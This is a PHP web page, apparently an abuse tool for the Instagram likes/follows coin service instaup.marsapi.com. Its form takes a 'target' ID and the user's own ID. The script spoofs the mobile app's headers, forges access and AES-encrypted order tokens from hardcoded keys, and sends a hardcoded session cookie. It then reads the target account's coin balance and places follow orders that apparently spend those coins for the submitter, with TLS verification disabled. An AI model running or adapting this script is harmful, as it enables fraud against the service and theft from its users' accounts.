<html>
   <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
      <script src="https://kit.fontawesome.com/55db5a84a3.js" crossorigin="anonymous"></script>
      <style>
         .btn {
         background-color:white;
         color: #060BE5;
         border-radius:5px;
         border:solid;
         }
      .form-control {
         background-color:white;
         color: #060BE5;
         border-radius:5px;
         border:solid;
         }
      </style>
   </head>
   <body>
     <?php
error_reporting(0);
echo "
<br>        
<br>           
<center><h1>|lilith|<span></span></h1></center>        
<br>
";

if(isset($_GET['submit'])){
$uidx=$_GET['userid'];
$uid=$_GET['target'];
 
    
  function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(1,0);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }



  $x18=rando(18);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$url1='https://instaup.marsapi.com/get_likes/user/coins';



$data0='market=Bazaar&user_id='.$uid.'&iad='.$x40.'&user_name='.$name;

$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$uid);


$headers1=['Xiaomi:29:M2007J20CI',
'access: '.$access,
'lng: en',
'cnt:in',
'versionName:17.0.1',
'version:90',
'pkg:f2c6d7a5b030a1542f7eb589d5013340',
'enMarket:EnglishWebPayment',
'market:PlayStore',
'uid:'.$uid,
'api_key: ABCXYZ123TEST',
'crc:4653145854/23927768',
"Nagent:0/02:00:00:00:00:00/48/de2b83032671b409/0/de7d6788fcf061b1341cf0661af36fe35ec72647",
'dsl:36f9a8e7',
'aid:de7d6788fcf061b1341cf0661af36fe35ec72646',
'special-user:1',
'Host:instaup.marsapi.com',
'Connection:Keep-Alive',
'Accept-Encoding:gzip',
'cookie:  token=57759904674%3A9dZVITowT1CnJT%3A20%3AAYcAgyCFPo_h0n5ALf_SRnyhB1cTevgHQ7u0BPyoXA',];


	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
	   curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
	$output1= curl_exec ($ch);
	
	curl_close ($ch);

    $json1=json_decode($output1,true);
  $c1=$json1['coins'];
  $d1 = $c1 / 4;
  $d2 = explode(".",$d1)['0'];
      $url0="https://instaup.marsapi.com/get_likes/order/follow";




$idx=$uid+3423;

$d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';

if($d2 > 10000){
$d2 = '10000';
} else {
$d2 = $d2;
}


$k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');





$dx=urlencode($dx);


$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';

 $data0='gift=0&order_count='.$d2.'&user_id='.$uid.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$uidx;

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
    $c=$jsonn['status'];
    if($c == 'Successful'){
echo "<body style='background-color: white;'>
<font color='blue'><hr>$output1<hr>
<font color='red'><hr>                  DONE : $d2<hr></font></center></div>";
} else {

echo "<body style='background-color: white;'>
<font color='black'><hr>$output1<hr></font></center></div>
<font color='black'><hr>$cc<hr></font></center></div>";
}


	    }
	
	if(!isset($_GET['submit']))
	{
	?>
	<section>
		<div class="container p-5 ">
			<form action="" method="get">
				<div class="mb-3">
					<label class="form-label">Target Insta ID </label>
<input type='text' name='target' class="form-control" required>
					<div  class="form-text">Target Insta ID</div>
					
				</div>
				<div class="mb-3">
					<label class="form-label">ID</label>
					<input type='text' name='userid' class="form-control" required>
					<div  class="form-text">Your Insta ID</div>
					
				
					
				</div>
				<button type="submit" name='submit' value='submit' class="btn btn-primary">Submit</button>
				
			</form>
			
		</div>
		
	</section>
	<?php
	}
	?>

		
			
		</div>
		
	<script 
	
  </body>
  
</html>